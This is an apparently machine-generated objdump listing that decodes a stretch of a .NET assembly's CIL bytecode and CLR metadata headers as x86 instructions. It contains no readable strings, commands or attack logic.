  40363d:	6f                   	outsl  %ds:(%esi),(%dx)
  40363e:	8b 00                	mov    (%eax),%eax
  403640:	00 0a                	add    %cl,(%edx)
  403642:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  403647:	00 00                	add    %al,(%eax)
  403649:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  40364f:	0a 7d 3b             	or     0x3b(%ebp),%bh
  403652:	00 00                	add    %al,(%eax)
  403654:	04 02                	add    $0x2,%al
  403656:	09 7d 42             	or     %edi,0x42(%ebp)
  403659:	00 00                	add    %al,(%eax)
  40365b:	04 02                	add    $0x2,%al
  40365d:	7c 3c                	jl     0x40369b
  40365f:	00 00                	add    %al,(%eax)
  403661:	04 12                	add    $0x12,%al
  403663:	03 02                	add    (%edx),%eax
  403665:	28 16                	sub    %dl,(%esi)
  403667:	00 00                	add    %al,(%eax)
  403669:	2b de                	sub    %esi,%ebx
  40366b:	71 02                	jno    0x40366f
  40366d:	7b 42                	jnp    0x4036b1
  40366f:	00 00                	add    %al,(%eax)
  403671:	04 0d                	add    $0xd,%al
  403673:	02 7c 42 00          	add    0x0(%edx,%eax,2),%bh
  403677:	00 04 fe             	add    %al,(%esi,%edi,8)
  40367a:	15 33 00 00 01       	adc    $0x1000033,%eax
  40367f:	02 15 25 0a 7d 3b    	add    0x3b7d0a25,%dl
  403685:	00 00                	add    %al,(%eax)
  403687:	04 12                	add    $0x12,%al
  403689:	03 28                	add    (%eax),%ebp
  40368b:	8e 00                	mov    (%eax),%es
  40368d:	00 0a                	add    %cl,(%edx)
  40368f:	de 39                	fidivrs (%ecx)
  403691:	08 7b 16             	or     %bh,0x16(%ebx)
  403694:	00 00                	add    %al,(%eax)
  403696:	04 08                	add    $0x8,%al
  403698:	7b 17                	jnp    0x4036b1
  40369a:	00 00                	add    %al,(%eax)
  40369c:	04 08                	add    $0x8,%al
  40369e:	7b 18                	jnp    0x4036b8
  4036a0:	00 00                	add    %al,(%eax)
  4036a2:	04 08                	add    $0x8,%al
  4036a4:	7b 19                	jnp    0x4036bf
  4036a6:	00 00                	add    %al,(%eax)
  4036a8:	04 28                	add    $0x28,%al
  4036aa:	a1 00 00 0a 26       	mov    0x260a0000,%eax
  4036af:	de 19                	ficomps (%ecx)
  4036b1:	13 04 02             	adc    (%edx,%eax,1),%eax
  4036b4:	1f                   	pop    %ds
  4036b5:	fe                   	(bad)
  4036b6:	7d 3b                	jge    0x4036f3
  4036b8:	00 00                	add    %al,(%eax)
  4036ba:	04 02                	add    $0x2,%al
  4036bc:	7c 3c                	jl     0x4036fa
  4036be:	00 00                	add    %al,(%eax)
  4036c0:	04 11                	add    $0x11,%al
  4036c2:	04 28                	add    $0x28,%al
  4036c4:	92                   	xchg   %eax,%edx
  4036c5:	00 00                	add    %al,(%eax)
  4036c7:	0a de                	or     %dh,%bl
  4036c9:	13 02                	adc    (%edx),%eax
  4036cb:	1f                   	pop    %ds
  4036cc:	fe                   	(bad)
  4036cd:	7d 3b                	jge    0x40370a
  4036cf:	00 00                	add    %al,(%eax)
  4036d1:	04 02                	add    $0x2,%al
  4036d3:	7c 3c                	jl     0x403711
  4036d5:	00 00                	add    %al,(%eax)
  4036d7:	04 28                	add    $0x28,%al
  4036d9:	93                   	xchg   %eax,%ebx
  4036da:	00 00                	add    %al,(%eax)
  4036dc:	0a 2a                	or     (%edx),%ch
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	0e                   	push   %cs
  4036e7:	00 db                	add    %bl,%bl
  4036e9:	e9 00 19 34 00       	jmp    0x744fee
  4036ee:	00 01                	add    %al,(%ecx)
  4036f0:	36 02 7c 3c 00       	add    %ss:0x0(%esp,%edi,1),%bh
  4036f5:	00 04 03             	add    %al,(%ebx,%eax,1)
  4036f8:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  4036ff:	00 1b                	add    %bl,(%ebx)
  403701:	30 03                	xor    %al,(%ebx)
  403703:	00 96 00 00 00 0f    	add    %dl,0xf000000(%esi)
  403709:	00 00                	add    %al,(%eax)
  40370b:	11 02                	adc    %eax,(%edx)
  40370d:	7b 43                	jnp    0x403752
  40370f:	00 00                	add    %al,(%eax)
  403711:	04 0a                	add    $0xa,%al
  403713:	02 7b 45             	add    0x45(%ebx),%bh
  403716:	00 00                	add    %al,(%eax)
  403718:	04 0b                	add    $0xb,%al
  40371a:	06                   	push   %es
  40371b:	2c 35                	sub    $0x35,%al
  40371d:	07                   	pop    %es
  40371e:	28 12                	sub    %dl,(%edx)
  403720:	00 00                	add    %al,(%eax)
  403722:	06                   	push   %es
  403723:	6f                   	outsl  %ds:(%esi),(%dx)
  403724:	8b 00                	mov    (%eax),%eax
  403726:	00 0a                	add    %cl,(%edx)
  403728:	0c 12                	or     $0x12,%al
  40372a:	02 28                	add    (%eax),%ch
  40372c:	8c 00                	mov    %es,(%eax)
  40372e:	00 0a                	add    %cl,(%edx)
  403730:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  403735:	0a 7d 43             	or     0x43(%ebp),%bh
  403738:	00 00                	add    %al,(%eax)
  40373a:	04 02                	add    $0x2,%al
  40373c:	08 7d 46             	or     %bh,0x46(%ebp)
  40373f:	00 00                	add    %al,(%eax)
  403741:	04 02                	add    $0x2,%al
  403743:	7c 44                	jl     0x403789
  403745:	00 00                	add    %al,(%eax)
  403747:	04 12                	add    $0x12,%al
  403749:	02 02                	add    (%edx),%al
  40374b:	28 17                	sub    %dl,(%edi)
  40374d:	00 00                	add    %al,(%eax)
  40374f:	2b de                	sub    %esi,%ebx
  403751:	4f                   	dec    %edi
  403752:	02 7b 46             	add    0x46(%ebx),%bh
  403755:	00 00                	add    %al,(%eax)
  403757:	04 0c                	add    $0xc,%al
  403759:	02 7c 46 00          	add    0x0(%esi,%eax,2),%bh
  40375d:	00 04 fe             	add    %al,(%esi,%edi,8)
  403760:	15 33 00 00 01       	adc    $0x1000033,%eax
  403765:	02 15 25 0a 7d 43    	add    0x437d0a25,%dl
  40376b:	00 00                	add    %al,(%eax)
  40376d:	04 12                	add    $0x12,%al
  40376f:	02 28                	add    (%eax),%ch
  403771:	8e 00                	mov    (%eax),%es
  403773:	00 0a                	add    %cl,(%edx)
  403775:	de 17                	ficoms (%edi)
  403777:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  40377c:	43                   	inc    %ebx
  40377d:	00 00                	add    %al,(%eax)
  40377f:	04 02                	add    $0x2,%al
  403781:	7c 44                	jl     0x4037c7
  403783:	00 00                	add    %al,(%eax)
  403785:	04 09                	add    $0x9,%al
  403787:	28 a3 00 00 0a de    	sub    %ah,-0x21f60000(%ebx)
  40378d:	13 02                	adc    (%edx),%eax
  40378f:	1f                   	pop    %ds
  403790:	fe                   	(bad)
  403791:	7d 43                	jge    0x4037d6
  403793:	00 00                	add    %al,(%eax)
  403795:	04 02                	add    $0x2,%al
  403797:	7c 44                	jl     0x4037dd
  403799:	00 00                	add    %al,(%eax)
  40379b:	04 28                	add    $0x28,%al
  40379d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40379e:	00 00                	add    %al,(%eax)
  4037a0:	0a 2a                	or     (%edx),%ch
  4037a2:	00 00                	add    %al,(%eax)
  4037a4:	01 10                	add    %edx,(%eax)
  4037a6:	00 00                	add    %al,(%eax)
  4037a8:	00 00                	add    %al,(%eax)
  4037aa:	0e                   	push   %cs
  4037ab:	00 5d 6b             	add    %bl,0x6b(%ebp)
  4037ae:	00 17                	add    %dl,(%edi)
  4037b0:	34 00                	xor    $0x0,%al
  4037b2:	00 01                	add    %al,(%ecx)
  4037b4:	36 02 7c 44 00       	add    %ss:0x0(%esp,%eax,2),%bh
  4037b9:	00 04 03             	add    %al,(%ebx,%eax,1)
  4037bc:	28 a5 00 00 0a 2a    	sub    %ah,0x2a0a0000(%ebp)
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	1b 30                	sbb    (%eax),%esi
  4037c6:	03 00                	add    (%eax),%eax
  4037c8:	96                   	xchg   %eax,%esi
  4037c9:	00 00                	add    %al,(%eax)
  4037cb:	00 0f                	add    %cl,(%edi)
  4037cd:	00 00                	add    %al,(%eax)
  4037cf:	11 02                	adc    %eax,(%edx)
  4037d1:	7b 47                	jnp    0x40381a
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	04 0a                	add    $0xa,%al
  4037d7:	02 7b 49             	add    0x49(%ebx),%bh
  4037da:	00 00                	add    %al,(%eax)
  4037dc:	04 0b                	add    $0xb,%al
  4037de:	06                   	push   %es
  4037df:	2c 35                	sub    $0x35,%al
  4037e1:	07                   	pop    %es
  4037e2:	28 10                	sub    %dl,(%eax)
  4037e4:	00 00                	add    %al,(%eax)
  4037e6:	06                   	push   %es
  4037e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e8:	8b 00                	mov    (%eax),%eax
  4037ea:	00 0a                	add    %cl,(%edx)
  4037ec:	0c 12                	or     $0x12,%al
  4037ee:	02 28                	add    (%eax),%ch
  4037f0:	8c 00                	mov    %es,(%eax)
  4037f2:	00 0a                	add    %cl,(%edx)
  4037f4:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  4037f9:	0a 7d 47             	or     0x47(%ebp),%bh
  4037fc:	00 00                	add    %al,(%eax)
  4037fe:	04 02                	add    $0x2,%al
  403800:	08 7d 4a             	or     %bh,0x4a(%ebp)
  403803:	00 00                	add    %al,(%eax)
  403805:	04 02                	add    $0x2,%al
  403807:	7c 48                	jl     0x403851
  403809:	00 00                	add    %al,(%eax)
  40380b:	04 12                	add    $0x12,%al
  40380d:	02 02                	add    (%edx),%al
  40380f:	28 18                	sub    %bl,(%eax)
  403811:	00 00                	add    %al,(%eax)
  403813:	2b de                	sub    %esi,%ebx
  403815:	4f                   	dec    %edi
  403816:	02 7b 4a             	add    0x4a(%ebx),%bh
  403819:	00 00                	add    %al,(%eax)
  40381b:	04 0c                	add    $0xc,%al
  40381d:	02 7c 4a 00          	add    0x0(%edx,%ecx,2),%bh
  403821:	00 04 fe             	add    %al,(%esi,%edi,8)
  403824:	15 33 00 00 01       	adc    $0x1000033,%eax
  403829:	02 15 25 0a 7d 47    	add    0x477d0a25,%dl
  40382f:	00 00                	add    %al,(%eax)
  403831:	04 12                	add    $0x12,%al
  403833:	02 28                	add    (%eax),%ch
  403835:	8e 00                	mov    (%eax),%es
  403837:	00 0a                	add    %cl,(%edx)
  403839:	de 17                	ficoms (%edi)
  40383b:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  403840:	47                   	inc    %edi
  403841:	00 00                	add    %al,(%eax)
  403843:	04 02                	add    $0x2,%al
  403845:	7c 48                	jl     0x40388f
  403847:	00 00                	add    %al,(%eax)
  403849:	04 09                	add    $0x9,%al
  40384b:	28 a3 00 00 0a de    	sub    %ah,-0x21f60000(%ebx)
  403851:	13 02                	adc    (%edx),%eax
  403853:	1f                   	pop    %ds
  403854:	fe                   	(bad)
  403855:	7d 47                	jge    0x40389e
  403857:	00 00                	add    %al,(%eax)
  403859:	04 02                	add    $0x2,%al
  40385b:	7c 48                	jl     0x4038a5
  40385d:	00 00                	add    %al,(%eax)
  40385f:	04 28                	add    $0x28,%al
  403861:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403862:	00 00                	add    %al,(%eax)
  403864:	0a 2a                	or     (%edx),%ch
  403866:	00 00                	add    %al,(%eax)
  403868:	01 10                	add    %edx,(%eax)
  40386a:	00 00                	add    %al,(%eax)
  40386c:	00 00                	add    %al,(%eax)
  40386e:	0e                   	push   %cs
  40386f:	00 5d 6b             	add    %bl,0x6b(%ebp)
  403872:	00 17                	add    %dl,(%edi)
  403874:	34 00                	xor    $0x0,%al
  403876:	00 01                	add    %al,(%ecx)
  403878:	36 02 7c 48 00       	add    %ss:0x0(%eax,%ecx,2),%bh
  40387d:	00 04 03             	add    %al,(%ebx,%eax,1)
  403880:	28 a5 00 00 0a 2a    	sub    %ah,0x2a0a0000(%ebp)
  403886:	00 00                	add    %al,(%eax)
  403888:	1b 30                	sbb    (%eax),%esi
  40388a:	03 00                	add    (%eax),%eax
  40388c:	a1 00 00 00 14       	mov    0x14000000,%eax
  403891:	00 00                	add    %al,(%eax)
  403893:	11 02                	adc    %eax,(%edx)
  403895:	7b 4b                	jnp    0x4038e2
  403897:	00 00                	add    %al,(%eax)
  403899:	04 0a                	add    $0xa,%al
  40389b:	02 7b 4d             	add    0x4d(%ebx),%bh
  40389e:	00 00                	add    %al,(%eax)
  4038a0:	04 0b                	add    $0xb,%al
  4038a2:	06                   	push   %es
  4038a3:	2c 40                	sub    $0x40,%al
  4038a5:	07                   	pop    %es
  4038a6:	7b 13                	jnp    0x4038bb
  4038a8:	00 00                	add    %al,(%eax)
  4038aa:	04 07                	add    $0x7,%al
  4038ac:	7b 14                	jnp    0x4038c2
  4038ae:	00 00                	add    %al,(%eax)
  4038b0:	04 28                	add    $0x28,%al
  4038b2:	0c 00                	or     $0x0,%al
  4038b4:	00 06                	add    %al,(%esi)
  4038b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b7:	8b 00                	mov    (%eax),%eax
  4038b9:	00 0a                	add    %cl,(%edx)
  4038bb:	0c 12                	or     $0x12,%al
  4038bd:	02 28                	add    (%eax),%ch
  4038bf:	8c 00                	mov    %es,(%eax)
  4038c1:	00 0a                	add    %cl,(%edx)
  4038c3:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  4038c8:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	04 02                	add    $0x2,%al
  4038cf:	08 7d 4e             	or     %bh,0x4e(%ebp)
  4038d2:	00 00                	add    %al,(%eax)
  4038d4:	04 02                	add    $0x2,%al
  4038d6:	7c 4c                	jl     0x403924
  4038d8:	00 00                	add    %al,(%eax)
  4038da:	04 12                	add    $0x12,%al
  4038dc:	02 02                	add    (%edx),%al
  4038de:	28 19                	sub    %bl,(%ecx)
  4038e0:	00 00                	add    %al,(%eax)
  4038e2:	2b de                	sub    %esi,%ebx
  4038e4:	4f                   	dec    %edi
  4038e5:	02 7b 4e             	add    0x4e(%ebx),%bh
  4038e8:	00 00                	add    %al,(%eax)
  4038ea:	04 0c                	add    $0xc,%al
  4038ec:	02 7c 4e 00          	add    0x0(%esi,%ecx,2),%bh
  4038f0:	00 04 fe             	add    %al,(%esi,%edi,8)
  4038f3:	15 33 00 00 01       	adc    $0x1000033,%eax
  4038f8:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  4038fe:	00 00                	add    %al,(%eax)
  403900:	04 12                	add    $0x12,%al
  403902:	02 28                	add    (%eax),%ch
  403904:	8e 00                	mov    (%eax),%es
  403906:	00 0a                	add    %cl,(%edx)
  403908:	de 17                	ficoms (%edi)
  40390a:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  40390f:	4b                   	dec    %ebx
  403910:	00 00                	add    %al,(%eax)
  403912:	04 02                	add    $0x2,%al
  403914:	7c 4c                	jl     0x403962
  403916:	00 00                	add    %al,(%eax)
  403918:	04 09                	add    $0x9,%al
  40391a:	28 92 00 00 0a de    	sub    %dl,-0x21f60000(%edx)
  403920:	13 02                	adc    (%edx),%eax
  403922:	1f                   	pop    %ds
  403923:	fe                   	(bad)
  403924:	7d 4b                	jge    0x403971
  403926:	00 00                	add    %al,(%eax)
  403928:	04 02                	add    $0x2,%al
  40392a:	7c 4c                	jl     0x403978
  40392c:	00 00                	add    %al,(%eax)
  40392e:	04 28                	add    $0x28,%al
  403930:	93                   	xchg   %eax,%ebx
  403931:	00 00                	add    %al,(%eax)
  403933:	0a 2a                	or     (%edx),%ch
  403935:	00 00                	add    %al,(%eax)
  403937:	00 01                	add    %al,(%ecx)
  403939:	10 00                	adc    %al,(%eax)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	00 0e                	add    %cl,(%esi)
  40393f:	00 68 76             	add    %ch,0x76(%eax)
  403942:	00 17                	add    %dl,(%edi)
  403944:	34 00                	xor    $0x0,%al
  403946:	00 01                	add    %al,(%ecx)
  403948:	36 02 7c 4c 00       	add    %ss:0x0(%esp,%ecx,2),%bh
  40394d:	00 04 03             	add    %al,(%ebx,%eax,1)
  403950:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  403957:	00 1b                	add    %bl,(%ebx)
  403959:	30 05 00 b3 00 00    	xor    %al,0xb300
  40395f:	00 15 00 00 11 02    	add    %dl,0x2110000
  403965:	7b 4f                	jnp    0x4039b6
  403967:	00 00                	add    %al,(%eax)
  403969:	04 0a                	add    $0xa,%al
  40396b:	02 7b 51             	add    0x51(%ebx),%bh
  40396e:	00 00                	add    %al,(%eax)
  403970:	04 0b                	add    $0xb,%al
  403972:	06                   	push   %es
  403973:	2c 52                	sub    $0x52,%al
  403975:	07                   	pop    %es
  403976:	7b 15                	jnp    0x40398d
  403978:	00 00                	add    %al,(%eax)
  40397a:	04 07                	add    $0x7,%al
  40397c:	7b 16                	jnp    0x403994
  40397e:	00 00                	add    %al,(%eax)
  403980:	04 07                	add    $0x7,%al
  403982:	7b 17                	jnp    0x40399b
  403984:	00 00                	add    %al,(%eax)
  403986:	04 07                	add    $0x7,%al
  403988:	7b 18                	jnp    0x4039a2
  40398a:	00 00                	add    %al,(%eax)
  40398c:	04 07                	add    $0x7,%al
  40398e:	7b 19                	jnp    0x4039a9
  403990:	00 00                	add    %al,(%eax)
  403992:	04 28                	add    $0x28,%al
  403994:	0d 00 00 06 6f       	or     $0x6f060000,%eax
  403999:	8b 00                	mov    (%eax),%eax
  40399b:	00 0a                	add    %cl,(%edx)
  40399d:	0c 12                	or     $0x12,%al
  40399f:	02 28                	add    (%eax),%ch
  4039a1:	8c 00                	mov    %es,(%eax)
  4039a3:	00 0a                	add    %cl,(%edx)
  4039a5:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  4039aa:	0a 7d 4f             	or     0x4f(%ebp),%bh
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	04 02                	add    $0x2,%al
  4039b1:	08 7d 52             	or     %bh,0x52(%ebp)
  4039b4:	00 00                	add    %al,(%eax)
  4039b6:	04 02                	add    $0x2,%al
  4039b8:	7c 50                	jl     0x403a0a
  4039ba:	00 00                	add    %al,(%eax)
  4039bc:	04 12                	add    $0x12,%al
  4039be:	02 02                	add    (%edx),%al
  4039c0:	28 1a                	sub    %bl,(%edx)
  4039c2:	00 00                	add    %al,(%eax)
  4039c4:	2b de                	sub    %esi,%ebx
  4039c6:	4f                   	dec    %edi
  4039c7:	02 7b 52             	add    0x52(%ebx),%bh
  4039ca:	00 00                	add    %al,(%eax)
  4039cc:	04 0c                	add    $0xc,%al
  4039ce:	02 7c 52 00          	add    0x0(%edx,%edx,2),%bh
  4039d2:	00 04 fe             	add    %al,(%esi,%edi,8)
  4039d5:	15 33 00 00 01       	adc    $0x1000033,%eax
  4039da:	02 15 25 0a 7d 4f    	add    0x4f7d0a25,%dl
  4039e0:	00 00                	add    %al,(%eax)
  4039e2:	04 12                	add    $0x12,%al
  4039e4:	02 28                	add    (%eax),%ch
  4039e6:	8e 00                	mov    (%eax),%es
  4039e8:	00 0a                	add    %cl,(%edx)
  4039ea:	de 17                	ficoms (%edi)
  4039ec:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4039f1:	4f                   	dec    %edi
  4039f2:	00 00                	add    %al,(%eax)
  4039f4:	04 02                	add    $0x2,%al
  4039f6:	7c 50                	jl     0x403a48
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	04 09                	add    $0x9,%al
  4039fc:	28 92 00 00 0a de    	sub    %dl,-0x21f60000(%edx)
  403a02:	13 02                	adc    (%edx),%eax
  403a04:	1f                   	pop    %ds
  403a05:	fe                   	(bad)
  403a06:	7d 4f                	jge    0x403a57
  403a08:	00 00                	add    %al,(%eax)
  403a0a:	04 02                	add    $0x2,%al
  403a0c:	7c 50                	jl     0x403a5e
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	04 28                	add    $0x28,%al
  403a12:	93                   	xchg   %eax,%ebx
  403a13:	00 00                	add    %al,(%eax)
  403a15:	0a 2a                	or     (%edx),%ch
  403a17:	00 01                	add    %al,(%ecx)
  403a19:	10 00                	adc    %al,(%eax)
  403a1b:	00 00                	add    %al,(%eax)
  403a1d:	00 0e                	add    %cl,(%esi)
  403a1f:	00 7a 88             	add    %bh,-0x78(%edx)
  403a22:	00 17                	add    %dl,(%edi)
  403a24:	34 00                	xor    $0x0,%al
  403a26:	00 01                	add    %al,(%ecx)
  403a28:	36 02 7c 50 00       	add    %ss:0x0(%eax,%edx,2),%bh
  403a2d:	00 04 03             	add    %al,(%ebx,%eax,1)
  403a30:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  403a37:	00 42 53             	add    %al,0x53(%edx)
  403a3a:	4a                   	dec    %edx
  403a3b:	42                   	inc    %edx
  403a3c:	01 00                	add    %eax,(%eax)
  403a3e:	01 00                	add    %eax,(%eax)
  403a40:	00 00                	add    %al,(%eax)
  403a42:	00 00                	add    %al,(%eax)
  403a44:	0c 00                	or     $0x0,%al
  403a46:	00 00                	add    %al,(%eax)
  403a48:	76 34                	jbe    0x403a7e
  403a4a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  403a4d:	33 30                	xor    (%eax),%esi
  403a4f:	33 31                	xor    (%ecx),%esi
  403a51:	39 00                	cmp    %eax,(%eax)
  403a53:	00 00                	add    %al,(%eax)
  403a55:	00 05 00 6c 00 00    	add    %al,0x6c00
  403a5b:	00 f4                	add    %dh,%ah
  403a5d:	10 00                	adc    %al,(%eax)
  403a5f:	00 23                	add    %ah,(%ebx)
  403a61:	7e 00                	jle    0x403a63
  403a63:	00 60 11             	add    %ah,0x11(%eax)
  403a66:	00 00                	add    %al,(%eax)
  403a68:	bc 0e 00 00 23       	mov    $0x2300000e,%esp
  403a6d:	53                   	push   %ebx
  403a6e:	74 72                	je     0x403ae2
  403a70:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  403a77:	00 1c 20             	add    %bl,(%eax,%eiz,1)
  403a7a:	00 00                	add    %al,(%eax)
  403a7c:	54                   	push   %esp
  403a7d:	02 00                	add    (%eax),%al
  403a7f:	00 23                	add    %ah,(%ebx)
  403a81:	55                   	push   %ebp
  403a82:	53                   	push   %ebx
  403a83:	00 70 22             	add    %dh,0x22(%eax)
  403a86:	00 00                	add    %al,(%eax)
  403a88:	10 00                	adc    %al,(%eax)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	23 47 55             	and    0x55(%edi),%eax
  403a8f:	49                   	dec    %ecx
  403a90:	44                   	inc    %esp
  403a91:	00 00                	add    %al,(%eax)
  403a93:	00 80 22 00 00 28    	add    %al,0x28000022(%eax)
  403a99:	08 00                	or     %al,(%eax)
  403a9b:	00 23                	add    %ah,(%ebx)
  403a9d:	42                   	inc    %edx
  403a9e:	6c                   	insb   (%dx),%es:(%edi)
  403a9f:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa0:	62 00                	bound  %eax,(%eax)
  403aa2:	00 00                	add    %al,(%eax)
  403aa4:	00 00                	add    %al,(%eax)
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	02 00                	add    (%eax),%al
  403aaa:	00 01                	add    %al,(%ecx)
  403aac:	57                   	push   %edi
  403aad:	17                   	pop    %ss
  403aae:	a2 0b 09 0b 00       	mov    %al,0xb090b
  403ab3:	00 00                	add    %al,(%eax)
  403ab5:	fa                   	cli
  403ab6:	01 33                	add    %esi,(%ebx)
  403ab8:	00 16                	add    %dl,(%esi)
  403aba:	00 00                	add    %al,(%eax)
  403abc:	01 00                	add    %eax,(%eax)
  403abe:	00 00                	add    %al,(%eax)
  403ac0:	59                   	pop    %ecx
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 16                	add    %dl,(%esi)
  403ac5:	00 00                	add    %al,(%eax)
  403ac7:	00 52 00             	add    %dl,0x0(%edx)
  403aca:	00 00                	add    %al,(%eax)
  403acc:	38 00                	cmp    %al,(%eax)
  403ace:	00 00                	add    %al,(%eax)
  403ad0:	19 00                	sbb    %eax,(%eax)
  403ad2:	00 00                	add    %al,(%eax)
  403ad4:	0b 00                	or     (%eax),%eax
  403ad6:	00 00                	add    %al,(%eax)
  403ad8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403ad9:	00 00                	add    %al,(%eax)
  403adb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  403ade:	00 00                	add    %al,(%eax)
  403ae0:	15 00 00 00 02       	adc    $0x2000000,%eax
  403ae5:	00 00                	add    %al,(%eax)
  403ae7:	00 03                	add    %al,(%ebx)
  403ae9:	00 00                	add    %al,(%eax)
  403aeb:	00 04 00             	add    %al,(%eax,%eax,1)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	16                   	push   %ss
  403af1:	00 00                	add    %al,(%eax)
  403af3:	00 09                	add    %cl,(%ecx)
  403af5:	00 00                	add    %al,(%eax)
  403af7:	00 01                	add    %al,(%ecx)
  403af9:	00 00                	add    %al,(%eax)
  403afb:	00 05 00 00 00 02    	add    %al,0x2000000
  403b01:	00 00                	add    %al,(%eax)
  403b03:	00 11                	add    %dl,(%ecx)
  403b05:	00 00                	add    %al,(%eax)
  403b07:	00 1a                	add    %bl,(%edx)
  403b09:	00 00                	add    %al,(%eax)
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	00 69 07             	add    %ch,0x7(%ecx)
  403b10:	01 00                	add    %eax,(%eax)
  403b12:	00 00                	add    %al,(%eax)
  403b14:	00 00                	add    %al,(%eax)
  403b16:	06                   	push   %es
  403b17:	00 97 06 73 0b 06    	add    %dl,0x60b7306(%edi)
  403b1d:	00 04 07             	add    %al,(%edi,%eax,1)
  403b20:	73 0b                	jae    0x403b2d
  403b22:	06                   	push   %es
  403b23:	00 7f 05             	add    %bh,0x5(%edi)
  403b26:	41                   	inc    %ecx
  403b27:	0b 0f                	or     (%edi),%ecx
  403b29:	00 ef                	add    %ch,%bh
  403b2b:	0b 00                	or     (%eax),%eax
  403b2d:	00 06                	add    %al,(%esi)
  403b2f:	00 c0                	add    %al,%al
  403b31:	05 8e 09 06 00       	add    $0x6098e,%eax
  403b36:	7a 06                	jp     0x403b3e
  403b38:	8e 09                	mov    (%ecx),%cs
  403b3a:	06                   	push   %es
  403b3b:	00 5b 06             	add    %bl,0x6(%ebx)
  403b3e:	8e 09                	mov    (%ecx),%cs
  403b40:	06                   	push   %es
  403b41:	00 eb                	add    %ch,%bl
  403b43:	06                   	push   %es
  403b44:	8e 09                	mov    (%ecx),%cs
  403b46:	06                   	push   %es
  403b47:	00 b7 06 8e 09 06    	add    %dh,0x6098e06(%edi)
  403b4d:	00 d0                	add    %dl,%al
  403b4f:	06                   	push   %es
  403b50:	8e 09                	mov    (%ecx),%cs
  403b52:	06                   	push   %es
  403b53:	00 f2                	add    %dh,%dl
  403b55:	05 8e 09 06 00       	add    $0x6098e,%eax
  403b5a:	ac                   	lods   %ds:(%esi),%al
  403b5b:	05 54 0b 06 00       	add    $0x60b54,%eax
  403b60:	3d 05 54 0b 06       	cmp    $0x60b5405,%eax
  403b65:	00 3e                	add    %bh,(%esi)
  403b67:	06                   	push   %es
  403b68:	8e 09                	mov    (%ecx),%cs
  403b6a:	06                   	push   %es
  403b6b:	00 0d 06 c3 07 06    	add    %cl,0x607c306
  403b71:	00 40 0d             	add    %al,0xd(%eax)
  403b74:	d7                   	xlat   %ds:(%ebx)
  403b75:	08 06                	or     %al,(%esi)
  403b77:	00 0f                	add    %cl,(%edi)
  403b79:	05 d7 08 0a 00       	add    $0xa08d7,%eax
  403b7e:	4b                   	dec    %ebx
  403b7f:	05 98 0a 06 00       	add    $0x60a98,%eax
  403b84:	62 05 41 0b 06 00    	bound  %eax,0x60b41
  403b8a:	22 05 73 0b 06 00    	and    0x60b73,%al
  403b90:	7b 0a                	jnp    0x403b9c
  403b92:	93                   	xchg   %eax,%ebx
  403b93:	0b 06                	or     (%esi),%eax
  403b95:	00 06                	add    %al,(%esi)
  403b97:	0a 72 09             	or     0x9(%edx),%dh
  403b9a:	0a 00                	or     (%eax),%al
  403b9c:	e5 04                	in     $0x4,%eax
  403b9e:	60                   	pusha
  403b9f:	08 0a                	or     %cl,(%edx)
  403ba1:	00 93 05 60 08 0a    	add    %dl,0xa086005(%ebx)
  403ba7:	00 b5 04 5d 09 0e    	add    %dh,0xe095d04(%ebp)
  403bad:	00 ed                	add    %ch,%ch
  403baf:	08 91 0c 0a 00 b0    	or     %dl,-0x4ffff5f4(%ecx)
  403bb5:	0a 60 08             	or     0x8(%eax),%ah
  403bb8:	12 00                	adc    (%eax),%al
  403bba:	76 08                	jbe    0x403bc4
  403bbc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403bbd:	0c 12                	or     $0x12,%al
  403bbf:	00 19                	add    %bl,(%ecx)
  403bc1:	0a a6 0c 12 00 eb    	or     -0x14ffedf4(%esi),%ah
  403bc7:	09 a6 0c 12 00 51    	or     %esp,0x5100120c(%esi)
  403bcd:	08 a6 0c 12 00 de    	or     %ah,-0x21ffedf4(%esi)
  403bd3:	08 a6 0c 12 00 25    	or     %ah,0x2500120c(%esi)
  403bd9:	0b a6 0c 12 00 71    	or     0x7100120c(%esi),%esp
  403bdf:	0e                   	push   %cs
  403be0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403be1:	0c 12                	or     $0x12,%al
  403be3:	00 8a 08 a6 0c 06    	add    %cl,0x60ca608(%edx)
